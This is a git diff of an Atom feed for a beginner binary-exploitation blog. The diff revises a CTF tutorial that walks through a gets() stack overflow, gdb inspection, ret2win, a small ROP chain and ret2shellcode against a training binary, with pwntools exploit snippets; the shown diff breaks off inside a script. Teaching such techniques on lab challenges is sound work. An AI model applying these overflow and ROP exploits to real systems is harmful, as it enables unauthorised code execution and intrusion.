@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="http://tourpran.me/feed.xml" rel="self" type="application/atom+xml" /><link href="http://tourpran.me/" rel="alternate" type="text/html" /><updated>2021-05-25T15:06:26+05:30</updated><id>http://tourpran.me/feed.xml</id><title type="html">TourPran Blogs</title><subtitle>This is my blog for Binary Exploitation and Reverse Engineering.</subtitle><author><name>tourpran</name></author><entry><title type="html">Return to libc</title><link href="http://tourpran.me/pwn-training/2021/05/24/return2libcpwntrain.html" rel="alternate" type="text/html" title="Return to libc" /><published>2021-05-24T00:00:00+05:30</published><updated>2021-05-24T00:00:00+05:30</updated><id>http://tourpran.me/pwn-training/2021/05/24/return2libcpwntrain</id><content type="html" xml:base="http://tourpran.me/pwn-training/2021/05/24/return2libcpwntrain.html">&lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining3/pwntrain1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="http://tourpran.me/feed.xml" rel="self" type="application/atom+xml" /><link href="http://tourpran.me/" rel="alternate" type="text/html" /><updated>2021-05-26T21:05:31+05:30</updated><id>http://tourpran.me/feed.xml</id><title type="html">TourPran Blogs</title><subtitle>This is my blog for Binary Exploitation and Reverse Engineering.</subtitle><author><name>tourpran</name></author><entry><title type="html">Return to libc</title><link href="http://tourpran.me/pwn-training/2021/05/24/return2libcpwntrain.html" rel="alternate" type="text/html" title="Return to libc" /><published>2021-05-24T00:00:00+05:30</published><updated>2021-05-24T00:00:00+05:30</updated><id>http://tourpran.me/pwn-training/2021/05/24/return2libcpwntrain</id><content type="html" xml:base="http://tourpran.me/pwn-training/2021/05/24/return2libcpwntrain.html">&lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining3/pwntrain1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;introduction&quot;&gt;Introduction:&lt;/h3&gt;
 
@@ -390,7 +390,7 @@ continue
 
 &lt;h3 id=&quot;introduction&quot;&gt;Introduction:&lt;/h3&gt;
 
-&lt;p&gt;This is an initiative taken by team members of ARESx. In this series of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwn-training&lt;/code&gt; we will be looking into various types of attacks performed on binaries. This in the first part of the series. We will start of slow with a simple return to shellcode challenge. Most of the challenge binary’s code will also be provided.&lt;/p&gt;
+&lt;p&gt;This is an initiative taken by team members of &lt;a href=&quot;https://ctftime.org/team/128734&quot;&gt;ARESx&lt;/a&gt;. In this series of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwn-training&lt;/code&gt; we will be looking into various types of attacks performed on binaries. This in the first part of the series. We will start of slow with a simple return to shellcode challenge. Most of the challenge binary’s code will also be provided.&lt;/p&gt;
 
 &lt;h3 id=&quot;challenge&quot;&gt;Challenge:&lt;/h3&gt;
 
@@ -403,92 +403,118 @@ continue
 
 &lt;h4 id=&quot;mitigations&quot;&gt;Mitigations:&lt;/h4&gt;
 
-&lt;p&gt;Before going into the exploitation its better to check what mitigations are enabled for a bianry. Mitigations are protections that were included to avoid certain attacks. For example.&lt;/p&gt;
+&lt;p&gt;Before going into the exploitation its better to check what mitigations are enabled for a binary. Mitigations are protections that were included to avoid certain attacks. We use the command checksec to see the basic mitigations in a binary.&lt;/p&gt;
+
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;checksec &lt;span class=&quot;nt&quot;&gt;--file&lt;/span&gt; ./ret2shellcode
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining1/pwntrain1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;If you don’t have checksec installed then&lt;/p&gt;
+&lt;p&gt;If you don’t have checksec installed then,&lt;/p&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;checksec
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;RELRO:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;RELRO:&lt;/strong&gt;&lt;/p&gt;
 &lt;ul&gt;
-  &lt;li&gt;Partial RELRO - in attackers point of view, does nothing but leaves the got writeable.&lt;/li&gt;
-  &lt;li&gt;Full RELRO    - makes the GOT read-only therefore mitigating the “got-overwrite” attack. (got-overwrite coming soon ;) )&lt;/li&gt;
+  &lt;li&gt;Partial RELRO - In attackers point of view, does nothing but leaves the GOT (Global offset table) writeable.&lt;/li&gt;
+  &lt;li&gt;Full RELRO    - makes the GOT read-only, therefore mitigating the “GOT-overwrite” attack. ( Discussed briefly later).&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;CANARY:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;CANARY:&lt;/strong&gt;&lt;/p&gt;
 &lt;ul&gt;
-  &lt;li&gt;its a set of characters stored on the stack to make sure no buffer overflows takes place. (we can bypass this later)&lt;/li&gt;
+  &lt;li&gt;Its a set of characters stored on the stack to make sure no buffer overflows takes place. It will do a check on the canary before returning. (we can bypass this later)&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;No eXecute:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;No eXecute:&lt;/strong&gt;&lt;/p&gt;
 &lt;ul&gt;
-  &lt;li&gt;NX Enabled - this makes sure that the code on the stack is not excecuted.(not that simple but lets go with this for now)&lt;/li&gt;
-  &lt;li&gt;NX Disabled - yea you guessed it. the code on the stack can be excecuted.&lt;/li&gt;
+  &lt;li&gt;NX Enabled - This makes sure that the code on the stack is not excecuted. (not that simple but lets go with this for now)&lt;/li&gt;
+  &lt;li&gt;NX Disabled - Yea you guessed it, the code on the stack can be excecuted.&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;PIE:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;PIE:&lt;/strong&gt;&lt;/p&gt;
 &lt;ul&gt;
-  &lt;li&gt;position independent excecutable: will randomise the address of the code and PLT.&lt;/li&gt;
+  &lt;li&gt;Position Independent Excecutable: will randomise the address of the code and PLT.&lt;/li&gt;
   &lt;li&gt;point to note : the libc address will always be different cause they are PIC (Position Independent Code). Even they dont know where they are laoded lmao.&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;RWX:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;RWX:&lt;/strong&gt;&lt;/p&gt;
 &lt;ul&gt;
-  &lt;li&gt;Read, write and execute : It’ll tell us if the binary has segments that we can write and excecute.&lt;/li&gt;
+  &lt;li&gt;Read, write and execute : It’ll tell us if the binary has segments that we can read, write and excecute.&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;h4 id=&quot;code-walkthrough&quot;&gt;Code walkthrough:&lt;/h4&gt;
 
-&lt;p&gt;IF you are a curious assembly code lover make sure to head over to the gdb and dig deep. Here I’ll go through the c code since its a basic writeup.&lt;/p&gt;
+&lt;p&gt;IF you are a curious assembly code lover, make sure to head over to the gdb and dig deep. Here I’ll go through the c code since its a basic writeup.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining1/pwntrain2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Just ignore the ignore_me() function its for standard buffering and stuff. There are 2 functions called win and main. looking at main we see there is a buf variable with size 0x60 and a puts call. There is also a printf that will leak the address of the buf variable [intresting].&lt;/p&gt;
+&lt;p&gt;Just ignore the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ignore_me()&lt;/code&gt; function its for standard buffering and stuff. There are 2 functions called &lt;strong&gt;win&lt;/strong&gt; and &lt;strong&gt;main&lt;/strong&gt;.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Looking at &lt;strong&gt;main&lt;/strong&gt; function, we see there is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buf&lt;/code&gt; variable with size 0x60 and a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt; call. There is also a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; that will leak the address of the buf variable [intresting].&lt;/li&gt;
+&lt;/ul&gt;
 
-&lt;p&gt;There is another function called gets(). we all at this point know its a dangerous function. lets see why.&lt;/p&gt;
+&lt;p&gt;There is another function called gets(). We know its a dangerous function. lets see why.&lt;/p&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;man gets
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining1/pwntrain3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;seems like gets will take input as long as there is a newline character which means we can get past the buf variable and mess things in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stack&lt;/code&gt;. So this stack is just a memory region where all the static allocations happen. lets open this in gdb and see what is happening.&lt;/p&gt;
+&lt;p&gt;Seems like gets will take input &lt;ins&gt;as long as there is a newline&lt;/ins&gt; character which means we can get past the buf variable and mess things in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stack&lt;/code&gt;. 
+&lt;strong&gt;Stack&lt;/strong&gt; is just a memory region where all the static allocations happen. All the declaration of new variables, initialisation of different datatypes are stored here. All this allocation commands happens before excecuting the program. lets open this in gdb and see what is happening.&lt;/p&gt;
 
-&lt;p&gt;I have a different version / flavour of gdb called pwndbg. &lt;a href=&quot;https://github.com/pwndbg/pwndbg&quot;&gt;link to download&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;GDB&lt;/strong&gt; is a debugger that will break down the program into its assembly code. It makes things easier for a reverse engineering to know what a program does in GDB. I have a different version / flavour of gdb called pwndbg. &lt;a href=&quot;https://github.com/pwndbg/pwndbg&quot;&gt;link to download&lt;/a&gt;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;disass main
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining1/pwntrain4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;I know a lot of shit is happening but dont worry we only want to set a break point in the return at the end. These breakpoints are stops that’ll happen at specific address that you define when you run the binary in gdb.&lt;/p&gt;
+&lt;p&gt;Ok, This is the main function that we saw earlier. Here a stack frame is created with the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rbp; mov rbp,rsp&lt;/code&gt; . For each function a new stack frame will be created to store variables required in a function.&lt;/p&gt;
+
+&lt;p&gt;Point to note, The arguments to the function are passed via registers. RDI, RSI, RDX registers are used to store the first, second, third argument to a function.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Here we see that the 3 arguments are set in the respective registers.&lt;/li&gt;
+  &lt;li&gt;Puts function is called with what is in the RDI register.&lt;/li&gt;
+  &lt;li&gt;We can also see a printf function which is called with RDI set to RIP+0xe29, which is the start of our buffer. Here RIP refers to the instruction pointer.&lt;/li&gt;
+  &lt;li&gt;Finally a gets is also called, which is exploited in our case.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Now, we will set a break point in GDB to stop at a particular location that we specify during the runtime. By doing this at a specific instruction we can know what the registers are holding and what changes are made at that point of time in the excecution.&lt;/p&gt;
+
+&lt;p&gt;To set a breakpoint ` b * address of the instruction`, in this case set a break point at ret instruction in main.&lt;/p&gt;
 
 &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;b* 0x0000000000401238
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;b for break and give the address of ret at the end of main. Now run the binary and see if you can crash it in someway. Go ahead and see if oyu can get some crash in the binary.&lt;/p&gt;
 
-&lt;p&gt;Great if you got a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;segfault&lt;/code&gt; else no worries. well do it together. run the binary in gdb with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r&lt;/code&gt; and then give 0x60 “a”s . this will fill up the buf variable. after those random “a”s maybe create a offset pattern like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;111111112222222233333333&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Take some time of your own, play around with the binary and see if you can crash the binary in some way.&lt;/p&gt;
+
+&lt;p&gt;Great if you got a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;segfault&lt;/code&gt; else no worries. well do it together. Run the binary in gdb with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r&lt;/code&gt; and then give 0x60 “a”s, this will fill up the buf variable with all that garbage. After those random “a”s maybe create an offset pattern like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;111111112222222233333333&lt;/code&gt;. This is just to see if something wrong happens. If there is a problem we can also see what the problem is, if we give an offset pattern.&lt;/p&gt;
+
 &lt;ul&gt;
-  &lt;li&gt;Segfault - its caused because our program is trying to read a part of memory thats invalid in this case it tried to jump to the address &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;22222222&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Segfault - It is caused because our program is trying to read a part of memory thats invalid&lt;/li&gt;
 &lt;/ul&gt;
+
+&lt;p&gt;In our case we overflowed the buf variable with “a”s and filling the RBP with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;11111111&lt;/code&gt; and finally making the return address point to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;22222222&lt;/code&gt;. Since there is no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;22222222&lt;/code&gt; address in memory, we will get a segfault.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining1/pwntrain5.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;ooof dont worry. there is a lot of information about different registers in the image but we are particularly intrested in 1 register called rsp. The rsp is the stack pointer or the register that holds infomartion about the next location to excecute. But do you see something fishy there ? Exactly we can control the return address of main. This means that we can make the binary excecute what we want.&lt;/p&gt;
+&lt;p&gt;You can see all the values set in the registers like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RAX&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RBX&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RCX&lt;/code&gt;. To our intrest we need the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt;.
+The RSP is the stack pointer or the register that holds infomartion about the next location to excecute. But do you see something fishy there ? Exactly we can control the return address of main. This means that we can make the binary excecute what we want.&lt;/p&gt;
 
 &lt;h4 id=&quot;aim&quot;&gt;Aim:&lt;/h4&gt;
 
-&lt;p&gt;As an attacker our aim is to make this binary give a shell for us in the server. So we looked at a win() function earlier, this will land us a nice neat shell! Tho there wont be any win() function in real life applications, its your task to somehow find ways to get a shell in the server.&lt;/p&gt;
+&lt;p&gt;As an attacker our aim is to make this binary give a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell&lt;/code&gt; for us in the server. A shell is a way of getting complete access on whatever target we are attacking. In future blogs, you might also see that you wont have the root (admin) access in a shell. You have to do several privilage escalations to make yourself root, though all of those fun stuff are for another time.&lt;/p&gt;
+
+&lt;p&gt;So we looked at a win() function earlier, this will land us a nice neat shell!
+Though there wont be any win() function in real life applications, its your task to somehow find ways to get a shell in the server.&lt;/p&gt;
 
 &lt;h4 id=&quot;return-to-win&quot;&gt;Return to win:&lt;/h4&gt;
 
-&lt;p&gt;now since we control the return address of main why not lets change the return address to win function?&lt;/p&gt;
+&lt;p&gt;Now since we control the return address of main function, why not lets change the return address to win function?&lt;/p&gt;
 &lt;ul&gt;
-  &lt;li&gt;Win function does execve(“/bin/sh”) -&amp;gt; which means that it’ll call a system function called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve&lt;/code&gt; and excecute the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; which is a shell.&lt;/li&gt;
+  &lt;li&gt;Win function does &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve(&quot;/bin/sh&quot;)&lt;/code&gt; -&amp;gt; which means that it’ll call a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; function called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve&lt;/code&gt; and excecute the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; which is a shell.&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;ok lets start writing our script in python. First we will import pwntools library to make things easier. next we will connect to our binary and send/recieve messages.&lt;/p&gt;
+&lt;p&gt;ok lets start writing our script in python. First we will &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;import pwntools&lt;/code&gt; library to make things easier. Next we will connect to our binary and send/recieve messages.&lt;/p&gt;
 
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
 
@@ -497,7 +523,10 @@ continue
 &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Here in the sendline command I am giving “a” * 0x60 to fill the buf variable and extra “a” * 8 to fill the rbp (base pointer) and then the address of win function. wait what is that p64() ? -&amp;gt; p64() function will make your address into little endian format.&lt;/p&gt;
+&lt;p&gt;Here in the sendline command I am giving “a” * 0x60 to fill the buf variable and extra “a” * 8 to fill the rbp (base pointer) and then the address of win function. wait what is that p64() ?&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;p64() function will make your address into little endian format. To know more about &lt;a href=&quot;https://www.geeksforgeeks.org/little-and-big-endian-mystery/&quot;&gt;formats&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 
 &lt;p&gt;Run this script and lets see what we get. SHOOT you get something called EOF (End Of File) ?&lt;/p&gt;
 
@@ -507,15 +536,14 @@ continue
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining1/pwntrain7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;So we have to somehow make the arg1 = 0xdeadbeef and arg2 = 0xcafebabe. This is where return oriented programming comes into picture.&lt;/p&gt;
+&lt;p&gt;So we have to somehow make the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arg1 = 0xdeadbeef&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arg2 = 0xcafebabe&lt;/code&gt;. This is where return oriented programming comes into picture.&lt;/p&gt;
 
 &lt;h5 id=&quot;return-oriented-programming&quot;&gt;Return Oriented Programming:&lt;/h5&gt;
 
 &lt;p&gt;This is a type of attack where we use static code or code thats been used to make this binary. we will combine one or many such code snippets to form a chain that’ll do something valuable to us.&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;Since win is a function with arg1 and arg2 as parameters. We have to know that the parameters to a function is given through registers and specifically by RDI, RSI, RDX for the first, second, and third arguments respectively.&lt;/li&gt;
-  &lt;li&gt;so we can set RDI = 0xdeadbeef and RSI = 0xcafebabe. then call win function.&lt;/li&gt;
+  &lt;li&gt;Since win is a function with arg1 and arg2 as parameters. We can set RDI = 0xdeadbeef and RSI = 0xcafebabe. Then call win function.&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;h4 id=&quot;exploit-ret2win&quot;&gt;Exploit [ret2win]:&lt;/h4&gt;
@@ -527,7 +555,7 @@ continue
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining1/pwntrain8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;add the gadgets in the list and then give the values then call win function. HOORAY !!!&lt;/p&gt;
+&lt;p&gt;We can pop the registers to put the values we want and since every gadget has a return attached to it, we can call win function after those gadgets.&lt;/p&gt;
 
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
 
@@ -535,13 +563,13 @@ continue
 &lt;span class=&quot;n&quot;&gt;pause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x60&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x000000000040129b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0000000000401299&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xcafebabe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00000000004011a5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
 &lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining1/pwntrain9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h4 id=&quot;exploit-simpler-version&quot;&gt;Exploit [simpler version]:&lt;/h4&gt;
 
-&lt;p&gt;I know you went through all the struggle to set the arguments right. But if you can control the return address and jump literally anywhere, then why not just jump directly on the execve function.&lt;/p&gt;
+&lt;p&gt;I know you went through all the struggle to set the arguments right, but if you can control the return address and jump literally anywhere, then why not just jump directly on the execve function.&lt;/p&gt;
 
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
 
@@ -552,15 +580,15 @@ continue
 
 &lt;h4 id=&quot;return-2-shellcode&quot;&gt;return 2 shellcode:&lt;/h4&gt;
 
-&lt;p&gt;This is the third and final way that well discuss in this blog. Do you remember the leak at the begining ? Yes we will use the leak to get a shell. this time ignore the win() function. without the help of helper function get a shell yourself :D .&lt;/p&gt;
+&lt;p&gt;This is the third and final way that we will discuss in this blog. Do you remember the leak at the begining ? Yes we will use the leak to get a shell. This time ignore the win() function. Without the help of helper function get a shell yourself :D .&lt;/p&gt;
 
 &lt;p&gt;Remember at the begining I said this binary is NX disabled. So we can basically store the commands that we want to excecute in buf variable and then jump back to the buf variable thereby excecuting whatever we want.&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;first step is to store the leak in a variable. We will use recvline function here.&lt;/li&gt;
-  &lt;li&gt;write all the commands that you want to excecute (pwntools has inbuilt functionalities :D )&lt;/li&gt;
-  &lt;li&gt;fill the gap between the return and the shellcode (shellcode -&amp;gt; all the commands to be excecuted )&lt;/li&gt;
-  &lt;li&gt;jump back to buf variable.&lt;/li&gt;
+  &lt;li&gt;First step is to store the leak in a variable. We will use recvline function here to recv the output given by the program.&lt;/li&gt;
+  &lt;li&gt;Write all the commands that you want to excecute to get a shell (pwntools has inbuilt functionalities :D ).&lt;/li&gt;
+  &lt;li&gt;Fill the gap between the return and the shellcode with dummy instructions called nop (shellcode -&amp;gt; all the commands to be excecuted )&lt;/li&gt;
+  &lt;li&gt;Jump back to buf variable.&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
